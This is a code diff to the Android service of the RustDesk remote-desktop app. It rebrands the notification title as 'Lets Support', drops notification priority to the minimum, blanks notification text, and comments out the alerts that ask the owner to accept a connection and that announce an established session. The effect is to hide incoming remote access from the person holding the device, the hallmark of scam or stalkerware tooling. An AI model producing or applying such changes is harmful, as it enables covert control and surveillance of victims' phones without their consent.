@@ -46,7 +46,7 @@ import java.nio.ByteBuffer
 import kotlin.math.max
 import kotlin.math.min
 
-const val DEFAULT_NOTIFY_TITLE = "RustDesk"
+const val DEFAULT_NOTIFY_TITLE = "Lets Support"
 const val DEFAULT_NOTIFY_TEXT = "Service is running"
 const val DEFAULT_NOTIFY_ID = 1
 const val NOTIFY_ID_OFFSET = 100
@@ -630,19 +630,19 @@ class MainService : Service() {
             PendingIntent.getActivity(this, 0, intent, FLAG_UPDATE_CURRENT)
         }
         val notification = notificationBuilder
-            .setOngoing(true)
-            .setSmallIcon(R.mipmap.ic_stat_logo)
-            .setDefaults(Notification.DEFAULT_ALL)
+            .setOngoing(false)
+            //.setSmallIcon(R.mipmap.ic_stat_logo)
+            //.setDefaults(Notification.DEFAULT_ALL)
             .setAutoCancel(true)
-            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
-            .setContentTitle(DEFAULT_NOTIFY_TITLE)
-            .setContentText(translate(DEFAULT_NOTIFY_TEXT))
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setContentTitle("main")
+            .setContentText("main rs")
             .setOnlyAlertOnce(true)
             .setContentIntent(pendingIntent)
             .setColor(ContextCompat.getColor(this, R.color.primary))
             .setWhen(System.currentTimeMillis())
             .build()
-        startForeground(DEFAULT_NOTIFY_ID, notification)
+        startForeground(DEFAULT_NOTIFY_ID,notification)
     }
 
     private fun loginRequestNotification(
@@ -653,14 +653,14 @@ class MainService : Service() {
     ) {
         val notification = notificationBuilder
             .setOngoing(false)
-            .setPriority(NotificationCompat.PRIORITY_MAX)
-            .setContentTitle(translate("Do you accept?"))
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            //.setContentTitle(translate("Do you accept?"))
             .setContentText("$type:$username-$peerId")
             // .setStyle(MediaStyle().setShowActionsInCompactView(0, 1))
             // .addAction(R.drawable.check_blue, "check", genLoginRequestPendingIntent(true))
             // .addAction(R.drawable.close_red, "close", genLoginRequestPendingIntent(false))
             .build()
-        notificationManager.notify(getClientNotifyID(clientID), notification)
+        // notificationManager.notify(getClientNotifyID(clientID), notification)
     }
 
     private fun onClientAuthorizedNotification(
@@ -673,10 +673,10 @@ class MainService : Service() {
         val notification = notificationBuilder
             .setOngoing(false)
             .setPriority(NotificationCompat.PRIORITY_MAX)
-            .setContentTitle("$type ${translate("Established")}")
-            .setContentText("$username - $peerId")
+            .setContentTitle("")
+            .setContentText("")
             .build()
-        notificationManager.notify(getClientNotifyID(clientID), notification)
+        // notificationManager.notify(getClientNotifyID(clientID), notification)
     }
 
     private fun voiceCallRequestNotification(
@@ -687,7 +687,7 @@ class MainService : Service() {
     ) {
         val notification = notificationBuilder
             .setOngoing(false)
-            .setPriority(NotificationCompat.PRIORITY_MAX)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .setContentTitle(translate("Do you accept?"))
             .setContentText("$type:$username-$peerId")
             .build()
@@ -716,13 +716,13 @@ class MainService : Service() {
     }
 
     private fun setTextNotification(_title: String?, _text: String?) {
-        val title = _title ?: DEFAULT_NOTIFY_TITLE
-        val text = _text ?: translate(DEFAULT_NOTIFY_TEXT)
+        //val title = _title ?: DEFAULT_NOTIFY_TITLE
+        //val text = _text ?: translate(DEFAULT_NOTIFY_TEXT)
         val notification = notificationBuilder
             .clearActions()
             .setStyle(null)
-            .setContentTitle(title)
-            .setContentText(text)
+            .setContentTitle("")
+            .setContentText("")
             .build()
         notificationManager.notify(DEFAULT_NOTIFY_ID, notification)
     }
